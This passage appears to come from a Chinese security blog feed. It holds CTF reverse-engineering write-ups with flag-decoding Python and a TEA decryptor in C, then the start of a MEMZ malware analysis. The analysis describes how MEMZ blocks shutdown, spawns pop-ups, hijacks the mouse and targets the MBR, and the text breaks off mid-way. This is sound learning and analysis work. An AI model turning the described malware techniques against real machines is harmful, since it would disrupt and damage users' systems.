src="https://i.loli.net/2021/09/14/qbTtSeGkh3dXD9I.png"><br>然后直接set，ip动调，得到rand()产生的数，虽然生成了32个，实际上只用了前16个。<br><img src="https://i.loli.net/2021/09/14/5vQCueiyX3FqWYm.png"><br>然后看看乱序函数，通过看比较部分就行了。<br><img src="https://i.loli.net/2021/09/14/Y6jFHAfOk4l7XW8.png"><br>问题就来了怎么逆回去，yyds的bxb师傅用了一个小技巧，rand()产生的数有两个字节，我们的字符只有一个字节，xor不会改变高字节的数，所以我们可以通过高字节的数来还原顺序，确实是比较妙，然后我是想直接自己输入假的字符串，然后得到假密文，从而知道乱序规律，然后逆回去，但是好像不可取，顺序还是乱的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># fake_flag=[0x00004126,0x00002f64,0x00005074,0x00007d08,0x000015e6,0x0000378c,0x00006fbb,0x00000d6b,0x00003f2a,0x0000413c,0x00000ebc,0x000010f8,0x00005c22,0x00001751,0x00001955,0x00001327]</span></span><br><span class="line"><span class="comment"># fake_enc=[0x00000029,0x00005074,0x00006fbb,0x0000378c,0x00004823,0x0000413c,0x00007d08,0x00000d6b,0x00003f2a,0x00006784,0x00006df1,0x00005af1,0x00001649,0x000041bb,0x000026e9,0x000001eb,0x00004126,0x00000ebc,0x00001955,0x00001327,0x00002f64,0x000015e6,0x000010f8,0x00005c22,0x00001751,0x000018be,0x00004ae1,0x00003d6c,0x00002cd6,0x000072ae,0x00006952,0x00005f90]</span></span><br><span class="line"><span class="comment"># print(hex(fake_enc[22]))</span></span><br><span class="line"><span class="comment"># index=[]</span></span><br><span class="line"><span class="comment"># for i in fake_flag:</span></span><br><span class="line"><span class="comment">#   index.append(fake_enc.index(i))</span></span><br><span class="line"><span class="comment"># print(index)</span></span><br><span class="line"><span class="comment">#这种不得行，得到的index是错误的。</span></span><br><span class="line">enc=[<span class="number">0x10a7</span>,<span class="number">0x3f72</span>,<span class="number">0x413f</span>,<span class="number">0x2f62</span>,<span class="number">0x15da</span>,<span class="number">0x5c10</span>,<span class="number">0x174b</span>,</span><br><span class="line">     <span class="number">0x6c6b</span>,<span class="number">0x37da</span>,<span class="number">0x3653</span>,<span class="number">0x1204</span>,<span class="number">0x1d0</span>,<span class="number">0x19e3</span>,<span class="number">0x349e</span>,</span><br><span class="line">     <span class="number">0x60e2</span>,<span class="number">0x40bf</span>,<span class="number">0x1b1d</span>,<span class="number">0x6f89</span>,<span class="number">0xd5c</span>,<span class="number">0x7d33</span>,<span class="number">0x3785</span>,</span><br><span class="line">     <span class="number">0xebc</span>,<span class="number">0x4118</span>,<span class="number">0x5027</span>,<span class="number">0x190a</span>,<span class="number">0x1338</span>,<span class="number">0x74f7</span>,<span class="number">0x4350</span>,</span><br><span class="line">     <span class="number">0x3797</span>,<span class="number">0x1dbb</span>,<span class="number">0x2457</span>,<span class="number">0x1f98</span>]</span><br><span class="line"></span><br><span class="line">enc1=[<span class="number">0x4118</span>, <span class="number">0x2F62</span>, <span class="number">0x5027</span>, <span class="number">0x7D33</span>, <span class="number">0x15DA</span>, <span class="number">0x3785</span>,</span><br><span class="line"><span class="number">0x6F89</span>, <span class="number">0x0D5C</span>, <span class="number">0x3F72</span>, <span class="number">0x413F</span>, <span class="number">0x0EBC</span>, <span class="number">0x10A7</span>,</span><br><span class="line"><span class="number">0x5C10</span>, <span class="number">0x174B</span>, <span class="number">0x190A</span>, <span class="number">0x1338</span>]</span><br><span class="line">rand=[<span class="number">0x4147</span>, <span class="number">0x2f06</span>, <span class="number">0x5017</span>, <span class="number">0x7d6c</span>, <span class="number">0x1583</span>, <span class="number">0x37ea</span>, <span class="number">0x6fdc</span>, <span class="number">0xd03</span>, <span class="number">0x3f43</span>,</span><br><span class="line"><span class="number">0x4156</span>, <span class="number">0xed7</span>, <span class="number">0x1094</span>, <span class="number">0x5c4f</span>, <span class="number">0x173f</span>, <span class="number">0x193a</span>, <span class="number">0x1357</span>]</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  s+=<span class="built_in">chr</span>((enc1[i]^rand[i])&amp;<span class="number">0xff</span>)</span><br><span class="line">print(s)</span><br><span class="line"><span class="comment">#_d0_YoU_1ik3_t0o</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拼接一下GWHT{r3_1S_s0_fuNny_d0_YoU_1ik3_t0o}</p><h2 id="OddCode"><a href="#OddCode" class="headerlink" title="OddCode"></a>OddCode</h2><p>流下太菜了的泪水，有师傅已经发了详细的wp了，<a href="https://bbs.pediy.com/thread-269328.htm">https://bbs.pediy.com/thread-269328.htm</a>，tql，tql，也该学习一下高级一点的东西了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF八月挑战赛 re</title>
      <link href="2021/09/05/DASCTF%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>2021/09/05/DASCTF%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF八月挑战赛-re"><a href="#DASCTF八月挑战赛-re" class="headerlink" title="DASCTF八月挑战赛 re#"></a>DASCTF八月挑战赛 re#</h1><p>做完了逆向，不得不说das的re还是比较友好的</p><h2 id="py"><a href="#py" class="headerlink" title="py"></a>py</h2><p>得到文件py.exe，肯定就是考python打包成exe文件了。可以参考文章<a href="https://blog.csdn.net/m0_37552052/article/details/88093427">https://blog.csdn.net/m0_37552052/article/details/88093427</a></p><p>用pyinstxtractor.py还原</p><p><code>python pyinstxtractor.py [filename]</code></p><p>得到文件夹，看到里面有个py.pyc，直接还原不行，用文章里面的方法还原pyc头文件，如果想学习pyc还可以看看这篇文章<a href="https://zhuanlan.zhihu.com/p/145811103">https://zhuanlan.zhihu.com/p/145811103</a><br>得到py文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.6 (tags/v3.8.6:db45529, Sep 23 2020, 15:52:53) [MSC v.1927 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: py.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        res = <span class="built_in">ord</span>(s[i]) ^ <span class="number">32</span></span><br><span class="line">        res += <span class="number">31</span></span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|&#x27;</span></span><br><span class="line">strings = <span class="string">&#x27;&#x27;</span></span><br><span class="line">strings = <span class="built_in">input</span>(<span class="string">&#x27;Input:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> encode(strings) == m:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Correct!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Try again!&#x27;</span></span><br></pre></td></tr></table></figure><p>很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">m = <span class="string">&#x27;ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|&#x27;</span></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">  <span class="built_in">str</span>+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">31</span>)^<span class="number">32</span>)</span><br><span class="line">print(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#flag&#123;24c4d6f158cacea10d379f711f8d6e2a&#125;</span></span><br></pre></td></tr></table></figure><h2 id="apkrev"><a href="#apkrev" class="headerlink" title="apkrev"></a>apkrev</h2><p>简单的apk逆向，加密函数和密文都在so文件的mycheck中，有经验的话不难看出是rc4，看不出来也没关系，反正最后就是一个异或，动调把异或数组取出来就行了，动调apk方法在<a href="https://the_itach1.gitee.io/2021/08/02/D0g3%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%20re%20wp/">https://the_itach1.gitee.io/2021/08/02/D0g3%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%20re%20wp/</a>的medical_app。</p><p>由于比较懒，不想一个一个调，就直接输入了个错误flag，然后得到假密文，去得到异或的数组。好像rc4的key是12345678，可能也可以用rc4来做。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fake_code=[   <span class="number">0xDD</span>, <span class="number">0x9F</span>, <span class="number">0x58</span>, <span class="number">0xB3</span>, <span class="number">0x72</span>, <span class="number">0xD0</span>, <span class="number">0xBC</span>, <span class="number">0xC4</span>, <span class="number">0x94</span>, <span class="number">0x56</span>,</span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0xA8</span>, <span class="number">0xCE</span>, <span class="number">0x54</span>, <span class="number">0x62</span>, <span class="number">0xCE</span>, <span class="number">0x1E</span>, <span class="number">0xF3</span>, <span class="number">0xF3</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0xB9</span>, <span class="number">0x19</span>, <span class="number">0x0F</span>, <span class="number">0xC6</span>, <span class="number">0x2D</span>, <span class="number">0x6E</span>, <span class="number">0xA3</span>, <span class="number">0xC0</span>, <span class="number">0x21</span>, <span class="number">0xD4</span>,</span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0x13</span>]</span><br><span class="line">fake_flag=<span class="string">&#x27;flag&#123;abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">enc=[<span class="number">0x8C</span>, <span class="number">0xC4</span>, <span class="number">0x00</span>, <span class="number">0xE6</span>, <span class="number">0x6A</span>, <span class="number">0x88</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0xC2</span>, <span class="number">0x07</span>,</span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0xA9</span>, <span class="number">0xC3</span>, <span class="number">0x0A</span>, <span class="number">0x3E</span>, <span class="number">0xC0</span>, <span class="number">0x44</span>, <span class="number">0xA6</span>, <span class="number">0xFE</span>, <span class="number">0x7E</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0x59</span>, <span class="number">0x4C</span>, <span class="number">0x83</span>, <span class="number">0x3D</span>, <span class="number">0x2B</span>, <span class="number">0xE2</span>, <span class="number">0xD3</span>, <span class="number">0x38</span>, <span class="number">0xCB</span>,</span><br><span class="line">  <span class="number">0x82</span>, <span class="number">0x5B</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(fake_flag[i])^fake_code[i]^enc[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#7792c9f724afe76e68c79116d07dafa5</span></span><br></pre></td></tr></table></figure><h2 id="LittleJunk"><a href="#LittleJunk" class="headerlink" title="LittleJunk"></a>LittleJunk</h2><p>好家伙，题刚出来2分钟就有人直接秒了，可能是出题人。</p><p>就是有很多花指令，来干扰分析，动调就好了，main函数前面一大部分感觉都是用来解密函数代码的，真正要看的地方在(loc_584000)(&amp;v19);</p><p>进去可以看到，图片里面忘了说sub_581FA0应该也是用来解密函数代码的。<br><img src="https://i.loli.net/2021/08/30/v1QeqDUy5gXh9mz.png"><br>然后先看看rc4吧<br><img src="https://i.loli.net/2021/08/30/mTURhx6JQIrgL5y.png"><br>retn后，32字节转4*8</p><p><img src="https://i.loli.net/2021/08/30/eB5f9kMlHZ7IFWV.png"><br>魔改的tea。<br><img src="https://i.loli.net/2021/08/30/JHFcr5wlW3g6SBn.png"></p><p>然后解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> __int64 *code , <span class="keyword">unsigned</span> __int64 *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">   <span class="keyword">unsigned</span> __int64 tmp1,tmp2,tmp3,tmp4,key1,key2,key3,key4,d;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    tmp1=code[<span class="number">0</span>];</span><br><span class="line">    tmp2=code[<span class="number">1</span>];</span><br><span class="line">    tmp3=code[<span class="number">2</span>];</span><br><span class="line">    tmp4=code[<span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">    key1=key[<span class="number">0</span>];</span><br><span class="line">    key2=key[<span class="number">1</span>];</span><br><span class="line">    key3=key[<span class="number">2</span>];</span><br><span class="line">    key4=key[<span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    d+=delta;</span><br><span class="line">    tmp1 += (key2 + (tmp2 &gt;&gt; <span class="number">5</span>)) ^ (d + tmp2) ^ (key1 + <span class="number">16</span> * tmp2);</span><br><span class="line">    tmp2 += (key4 + (tmp1 &gt;&gt; <span class="number">5</span>)) ^ (d + tmp1) ^ (key3 + <span class="number">16</span> * tmp1);</span><br><span class="line">    tmp3 += (key2 + (tmp4 &gt;&gt; <span class="number">5</span>)) ^ (d + tmp4) ^ (key1 + <span class="number">16</span> * tmp4);</span><br><span class="line">    tmp4 += (key4 + (tmp3 &gt;&gt; <span class="number">5</span>)) ^ (d + tmp3) ^ (key3 + <span class="number">16</span> * tmp3);</span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=tmp1;</span><br><span class="line">    code[<span class="number">1</span>]=tmp2;</span><br><span class="line">    code[<span class="number">2</span>]=tmp3;</span><br><span class="line">    code[<span class="number">3</span>]=tmp4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> __int64 *code , <span class="keyword">unsigned</span> __int64 *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">   <span class="keyword">unsigned</span> __int64 sum=delta*<span class="number">32</span>;<span class="comment">// sum=0x13C6EF3720</span></span><br><span class="line">   <span class="keyword">unsigned</span> __int64 tmp1,tmp2,tmp3,tmp4,key1,key2,key3,key4;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    tmp1=code[<span class="number">0</span>];</span><br><span class="line">    tmp2=code[<span class="number">1</span>];</span><br><span class="line">    tmp3=code[<span class="number">2</span>];</span><br><span class="line">    tmp4=code[<span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">    key1=key[<span class="number">0</span>];</span><br><span class="line">    key2=key[<span class="number">1</span>];</span><br><span class="line">    key3=key[<span class="number">2</span>];</span><br><span class="line">    key4=key[<span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    tmp4 -= (key4 + (tmp3 &gt;&gt; <span class="number">5</span>)) ^ (sum + tmp3) ^ (key3 + <span class="number">16</span> * tmp3);</span><br><span class="line">    tmp3 -= (key2 + (tmp4 &gt;&gt; <span class="number">5</span>)) ^ (sum + tmp4) ^ (key1 + <span class="number">16</span> * tmp4);</span><br><span class="line">    tmp2 -= (key4 + (tmp1 &gt;&gt; <span class="number">5</span>)) ^ (sum + tmp1) ^ (key3 + <span class="number">16</span> * tmp1);</span><br><span class="line">    tmp1 -= (key2 + (tmp2 &gt;&gt; <span class="number">5</span>)) ^ (sum + tmp2) ^ (key1 + <span class="number">16</span> * tmp2);</span><br><span class="line">    sum-=delta;</span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=tmp1;</span><br><span class="line">    code[<span class="number">1</span>]=tmp2;</span><br><span class="line">    code[<span class="number">2</span>]=tmp3;</span><br><span class="line">    code[<span class="number">3</span>]=tmp4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 code[<span class="number">4</span>]=&#123;<span class="number">0x0E990A522BE80F786</span>,<span class="number">0x8B836286B8A5EB59</span>,<span class="number">0x2FDE61CCEFC70FF8</span>,<span class="number">0x56BC19E119C8B07B</span>&#125;,key[<span class="number">4</span>]=&#123;<span class="number">0x54466076484C5476</span>,<span class="number">0x4550504F765F4344</span>,<span class="number">0x5A796F755F6D6179</span>,<span class="number">0x5F6E6565645F7468</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//encrypt(code,key);</span></span><br><span class="line">    decrypt(code,key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%016llx%016llx%016llx%016llx&quot;</span>,code[<span class="number">0</span>],code[<span class="number">1</span>],code[<span class="number">2</span>],code[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//505a4cc462489e8003aef16b785c7501343057844ff5acb809616159f51713f3 </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc = <span class="built_in">bytearray</span>.fromhex(<span class="string">&#x27;505a4cc462489e8003aef16b785c7501343057844ff5acb809616159f51713f3&#x27;</span>)</span><br><span class="line">fake_flag=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzabcdea&#x27;</span></span><br><span class="line">xor=[<span class="number">0x00000005</span>,<span class="number">0x00000059</span>,<span class="number">0x0000001a</span>,<span class="number">0x000000c3</span>,<span class="number">0x00000037</span>,<span class="number">0x00000048</span>,<span class="number">0x000000c8</span>,<span class="number">0x0000008a</span>,<span class="number">0x0000005f</span>,<span class="number">0x000000a7</span>,<span class="number">0x000000f9</span>,<span class="number">0x00000030</span>,<span class="number">0x00000073</span>,<span class="number">0x00000004</span>,<span class="number">0x0000002a</span>,<span class="number">0x00000014</span>,<span class="number">0x0000007c</span>,<span class="number">0x00000073</span>,<span class="number">0x0000001c</span>,<span class="number">0x000000c6</span>,<span class="number">0x0000000b</span>,<span class="number">0x000000b2</span>,<span class="number">0x000000ec</span>,<span class="number">0x000000f2</span>,<span class="number">0x00000041</span>,<span class="number">0x00000078</span>,<span class="number">0x00000038</span>,<span class="number">0x0000000c</span>,<span class="number">0x000000f4</span>,<span class="number">0x00000012</span>,<span class="number">0x00000046</span>,<span class="number">0x000000a5</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(fake_flag[i])^xor[i]^enc[i]))</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;4a5c0f1b5cc7f60e918611721c87ba07&#125;</span></span><br></pre></td></tr></table></figure><h2 id="寒王’sblog"><a href="#寒王’sblog" class="headerlink" title="寒王’sblog"></a>寒王’sblog</h2><p>照着博客做就行，关键是flag.jpg在哪，开始以为是头像，结果没解出来，后面f12看网页，也没找到，然后试了试直接在网页后面加上\flag.jpg，还真的有。</p><p>本人blog：<a href="https://the_itach1.gitee.io/">https://the_itach1.gitee.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MEMZ病毒分析</title>
      <link href="2021/09/05/MEMZ%E5%88%86%E6%9E%90/"/>
      <url>2021/09/05/MEMZ%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="MEMZ病毒分析"><a href="#MEMZ病毒分析" class="headerlink" title="MEMZ病毒分析"></a>MEMZ病毒分析</h1><p>第一次分析病毒，拿彩虹猫来练了练手，先自己分析过程，遇到不懂的在看其他师傅的分析，学到很多，本文章将一步步分析彩虹猫病毒的实现过程，并且还原部分代码。</p><h2 id="病毒分析的准备工作"><a href="#病毒分析的准备工作" class="headerlink" title="病毒分析的准备工作"></a>病毒分析的准备工作</h2><p>环境：我采用的是吾爱破解的xp系统，里面有很多现成的工具，ida，xdbg都有，只不过ida版本有点低，但是对于本病毒的分析也没太大影响，百度网盘链接：<a href="https://pan.baidu.com/s/1YvO264J-atvRUZew8AlS9g">https://pan.baidu.com/s/1YvO264J-atvRUZew8AlS9g</a> 提取码：abcd。（如果有大佬知道怎么在xp系统中使用更高版本的ida，或者有更好的分析病毒的虚拟机，可以在评论区给点资源，谢谢啦）</p><p>分析步骤，一般的病毒分析步骤，如下</p><ul><li>查壳，常见的有upx，ASpack，等等，可以用来实现简单免杀。</li><li>行为分析，是否修改注册表，联网，等等，可以在虚拟机中跑一遍看看效果(但是不要直接连网)，或者用<a href="https://www.virustotal.com/gui/">vt</a>直接跑跑看，有个大致的判断。</li><li>导入的dll以及API，使用StudyPE+去查看。</li><li>关键字符串，ida中shift+f12就可以直接查看。</li><li>放到ida静态分析，或者动调。</li></ul><p>但是，对于彩虹猫病毒这个样本，里面的函数和逻辑都比较清晰，先在虚拟机里面跑几遍，看看行为，就直接开始分析了。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>分析过程大致分为3部分，启动部分，检测部分，彩虹部分，MBR部分。</p><h3 id="启动部分"><a href="#启动部分" class="headerlink" title="启动部分"></a>启动部分</h3><p>首先判断该进程的传参，类似于标准 C 运行时argv和argc值。从而走不同的流程。<br><img src="https://i.loli.net/2021/09/05/k7a8RIxXsNFzDm2.png"><br>然后看下面干了什么。<br><img src="https://i.loli.net/2021/09/05/uWXS4cOBLUfVpCq.png"><br>大概就是以不同参数开了6个MEMZ.exe进程。对于里面出现的函数可以到MSDN官方文档去查，举个例子，对于**SetPriorityClass()**，推荐在谷歌用<a href="https://cn.bing.com/" title="必应">必应</a>上直接搜索该函数，然后进官方文档看函数参数意义，比如说，我要看0x80代表什么。<br><img src="https://i.loli.net/2021/09/05/84BLGxTblsXzD6g.png"></p><h3 id="检测部分"><a href="#检测部分" class="headerlink" title="检测部分"></a>检测部分</h3><p>这一部分就是用来判断用户是否主动关机，是否主动关闭MEMZ.exe，从而来用函数进行相应措施。</p><p>最外层。</p><p><img src="https://i.loli.net/2021/09/05/8QYvJ1tOhKalTgM.png"><br>然后来看看创建的线程函数check干了什么。<br><img src="https://i.loli.net/2021/09/05/ZTCOxEWU16ApqR7.png"><br>可以看出check函数用来判断是否主动关闭MEMZ.exe。</p><p>shutdown()函数中的StartAddress无法直接反编译，先用一位师傅<a href="https://bbs.pediy.com/thread-262873.htm">谁的狗哥</a>处理一下函数，然后来看看shutdown()函数。<br><img src="https://i.loli.net/2021/09/05/iPufLtQXz1VD4En.png"><br>然后看看创建的20个线程，就是用SetWindowsHookExW()实现了20个随机位置的messagebox弹窗，要理解这一部分，去查阅官方文档的函数。<br><img src="https://i.loli.net/2021/09/05/eky5H2NlMmPAzch.png"></p><p>然后我们跳出来，回到最外层，来看看消息处理函数干了什么。<br><img src="https://i.loli.net/2021/09/05/1ZKSgC3XIY7A89J.png"><br>WM_QUERYENDSESSION，<a href="https://blog.csdn.net/jessicaiu/article/details/83107903">https://blog.csdn.net/jessicaiu/article/details/83107903</a>所以这个就是用来防用户关机的。</p><p>到这里检测部分就分析完了。</p><h3 id="彩虹部分"><a href="#彩虹部分" class="headerlink" title="彩虹部分"></a>彩虹部分</h3><p>这部分是参数为/main的MEZE.exe进程执行的。主要表现在电脑桌面的花里胡哨。</p><p><img src="https://i.loli.net/2021/09/05/djaKM5cmLVe4olw.png"><br>这里v9类似于下面的结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> time;</span><br><span class="line"><span class="keyword">int</span> (*func)();</span><br><span class="line">&#125;functable;</span><br><span class="line"></span><br><span class="line">functable a[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>下面来分析这10个函数，里面很多api就不多讲了。</p><p>**func1()**，实现乱打开程序和网站。</p><p><img src="https://i.loli.net/2021/09/05/ZUI2vz83gWOjDwm.png"></p><p>**func2()**，实现鼠标不受控制。</p><p><img src="https://i.loli.net/2021/09/05/FbnqZ9EDO34Yz5S.png"></p><p>**func3()**，键盘消息</p><p><img src="https://i.loli.net/2021/09/05/8PCQirYRBb4lKV1.png"></p><p>**func4()**，发出声音</p><p><img 